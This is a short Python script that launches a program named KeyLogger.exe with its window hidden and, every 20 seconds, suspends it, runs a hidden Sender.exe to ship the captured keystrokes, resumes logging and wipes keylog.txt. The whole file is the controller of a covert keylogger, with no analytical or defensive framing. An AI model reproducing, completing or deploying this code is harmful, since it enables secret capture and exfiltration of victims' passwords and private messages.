import time
import psutil
import subprocess
import shlex

LOGGING_DURATION = 20

if __name__ == '__main__':
    si = subprocess.STARTUPINFO()

    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    logger_start_command = "./Logger/KeyLogger.exe /S"
    logger_cwd = "./Logger"

    sender_start_command = "./Sender/Sender.exe /S"
    sender_cwd = "./Sender"

    logger_args = shlex.split(logger_start_command)
    sender_args = shlex.split(sender_start_command)

    logger_pipe = subprocess.Popen(logger_args, startupinfo=si, cwd=logger_cwd)
    logger_process = psutil.Process(logger_pipe.pid)

    while True:
        print("Sending...")
        logger_process.suspend()
        sender_pipe = subprocess.Popen(
            sender_args, startupinfo=si, cwd=sender_cwd)
        while sender_pipe.poll() is None:
            continue
        logger_process.resume()

        print("Sender closed. Rewriting keylog.txt...")
        open("Logger/keylog.txt", "w").close()
        time.sleep(LOGGING_DURATION)
